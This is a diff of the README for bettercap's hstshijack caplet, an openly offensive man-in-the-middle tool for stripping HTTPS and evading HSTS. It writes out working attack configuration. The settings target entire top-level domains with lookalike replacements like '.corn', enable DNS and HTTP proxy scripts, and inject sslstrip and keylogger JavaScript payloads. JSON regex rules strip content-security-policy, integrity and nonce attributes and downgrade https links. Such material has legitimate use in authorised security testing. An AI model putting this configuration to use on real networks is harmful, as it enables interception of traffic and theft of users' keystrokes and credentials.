@@ -2,51 +2,56 @@
   <img width="420px" src="https://raw.githubusercontent.com/buffermet/cdn/master/github.com/bettercap/caplets/hstshijack/logo.svg" />
 </p>
 
-### Caplet
+### Caplet ([hstshijack.cap](https://github.com/bettercap/caplets/blob/master/hstshijack/hstshijack.cap))
 
 ```sh
 # Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
 
 # Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
 # variables get precendence over those assigned to the 'hstshijack.ignore' variable.
-set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.com
-set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
-set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
-set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
-set hstshijack.ssl.check       true
-#set hstshijack.blockscripts    example.com,*.example.com
-set hstshijack.obfuscate       true
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
-set hstshijack.whitelist       /usr/local/share/bettercap/caplets/hstshijack/whitelist.json
-set hstshijack.ignore          captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com,www.msftconnecttest.com
+set hstshijack.targets                    *.com, *.net,*.me, *.nl,*.ai,*.co.uk,*.cn,*.google
+set hstshijack.replacements               *.corn,*.nel,*.rne,*.ni,*.al,*.cc.uk,*.ch,*.googl
+set hstshijack.replacements.req.body      /usr/local/share/bettercap/caplets/hstshijack/replacements/req.Body.json
+set hstshijack.replacements.req.headers   /usr/local/share/bettercap/caplets/hstshijack/replacements/req.Headers.json
+set hstshijack.replacements.req.url       /usr/local/share/bettercap/caplets/hstshijack/replacements/req.URL.json
+set hstshijack.replacements.res.body      /usr/local/share/bettercap/caplets/hstshijack/replacements/res.Body.json
+set hstshijack.replacements.res.headers   /usr/local/share/bettercap/caplets/hstshijack/replacements/res.Headers.json
+set hstshijack.ssl.domains                /usr/local/share/bettercap/caplets/hstshijack/ssl/domains.txt
+set hstshijack.ssl.index                  /usr/local/share/bettercap/caplets/hstshijack/ssl/index.json
+set hstshijack.ssl.index.check            true
+set hstshijack.ssl.discovery.synchronous  true
+set hstshijack.ssl.discovery.timeout      4
+set hstshijack.cookies.downgrade          true
+#set hstshijack.blockscripts               example.com,*.example.com
+set hstshijack.obfuscate                  true
+set hstshijack.payloads                   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js
+set hstshijack.whitelist                  /usr/local/share/bettercap/caplets/hstshijack/session/whitelist.json
+set hstshijack.ignore                     captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com,www.msftconnecttest.com
 
 net.recon on
 
-set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/modules/http.proxy.js
 http.proxy on
 
-set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
-set dns.spoof.all      true
-dns.spoof on
+set dns.proxy.script /usr/local/share/bettercap/caplets/hstshijack/modules/dns.proxy.js
+dns.proxy on
 ```
 
 ### <a href="./payloads/hijack.js">**hijack.js**</a> payload
 
-This module injects files with a JavaScript payload (<a href="./payloads/hijack.js">**hijack.js**</a>) which acts as a callback for bettercap, and takes care of hostname spoofing in attributes of injected documents, as well as fetch and XMLHttpRequest.
-
-Injecting <a href="./payloads/hijack.js">**hijack.js**</a> is essential for hostname spoofing.
+This module injects files with a JavaScript payload (<a href="./payloads/hijack.js">**hijack.js**</a>) which acts as a callback for bettercap, and takes care of hostname spoofing in the DOM.
 
 ### Scalable domain indexing (SSL log)
 
 <br>
 
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/a419acb3-28b4-4927-a596-c96ab6c2552e" alt="Indexed domains that use HTTPS" />
+  <img src="https://raw.githubusercontent.com/buffermet/cdn/master/github.com/bettercap/caplets/hstshijack/ssl.index.png" alt="Indexed domains that use HTTPS" />
 </p>
 
 When hosts respond with an HTTPS redirect, bettercap will save their hostname in lists that are sorted by domain prefixes, allowing the list to scale by reducing a considerable amount of overhead for the proxy module.
 
-By default, this caplet will remap these lists of domains that were found in the file that you assigned to the `hstshijack.ssl.domains` variable on launch (to ensure that it is still in the right format). You can skip this by setting the `hstshijack.ssl.check` variable to `false`.
+By default, this caplet will remap these lists of domains that were found in the file that you assigned to the `hstshijack.ssl.domains` variable on launch (to ensure that it is still in the right format). You can skip this by setting the `hstshijack.ssl.index.check` variable to `false`.
 
 Bettercap will also send a HEAD request to unknown hosts that were discovered in the injected document and retrieved via a callback from the <a href="./payloads/hijack.js">**hijack.js**</a> payload. This is done to learn what hosts use HTTPS, ahead of time.
 
@@ -65,6 +70,43 @@ set hstshijack.replacements  google.corn,*.google.corn
 
 You can try to make them as unnoticeable as you can, but your options are limited here in terms of evading HSTS.
 
+### Regular Expression replacements
+
+In the <a href="https://github.com/bettercap/caplets/blob/master/hstshijack/replacements">**replacements directory**</a> you can find 5 JSON files that are used to spoof HTTP requests and responses. Each Regular Expression that you configure will be pre-compiled when the module is loaded.
+
+Each Regular Expression set is formatted as follows: `[SELECTOR, FLAGS, REPLACEMENT]`
+
+Example of response body replacements (<a href="https://raw.githubusercontent.com/bettercap/caplets/refs/heads/master/hstshijack/replacements/res.Body.json">res.Body.json</a>):
+
+```json
+{
+	"html": {
+		"*.amazon.com": [
+			["(['\"`](?:http|ws)|sourceMappingURL=http)s", "ig", "$1"],
+			["((?:['\"`](?:(?:http|ws)://|//)?|sourceMappingURL=http://)[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"],
+			[" http-equiv=['\"]?content-security-policy(?:-report-only)?['\"]?([ />])", "ig", "$1"],
+			[" integrity=['\"][^'\"]+['\"]([ />])", "ig", "$1"],
+			[" nonce=[\"][^\"]+['\"]([ />])", "ig", "$1"]
+		]
+	},
+	"javascript": {
+		"*.amazon.com": [
+			["((?:['\"`]|sourceMappingURL=)(?:http|ws))s", "ig", "$1"],
+			["((?:['\"`](?:(?:http|ws)://|//)?|sourceMappingURL=http://)[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"]
+		],
+		"apis.google.com": [
+			["(V=function\\(a\\)\\{)", "g", "$1if(1)return;"]
+		]
+	},
+	"json": {
+		"*": [
+			["(\"(?:http|ws))s", "ig", "$1"],
+			["(\"(?:(?:http|ws)://|//)?[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"]
+		]
+	}
+}
+```
+
 ### Block scripts
 
 In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript from hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 
@@ -73,15 +115,13 @@ In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript f
 
 You can also inject your own scripts into files from your specified hosts by assigning them to the `hstshijack.payloads` variable.
 
-Custom payloads are (optionally) obfuscated at launch, executed synchronously, and wrapped inside a function that is defined as a property of the current JavaScript context (globalThis). This is done to ensure that your payload is only executed once per application, even if injected multiple times. Individual payloads are not failsafe, so you must set your conditions/try and catch blocks yourself.
+Custom payloads are (optionally) obfuscated at launch, executed synchronously, and wrapped inside a function that is defined as a property of the current JavaScript context (globalThis). This is done to ensure that your payload is only executed once per application, even if injected multiple times.
 
 Example:
 
 ```sh
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+set hstshijack.payloads *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
 ```
-
-You should always inject the <a href="./payloads/hijack.js">**hijack.js**</a> payload when spoofing hostnames.
 
 ### Obfuscation
 
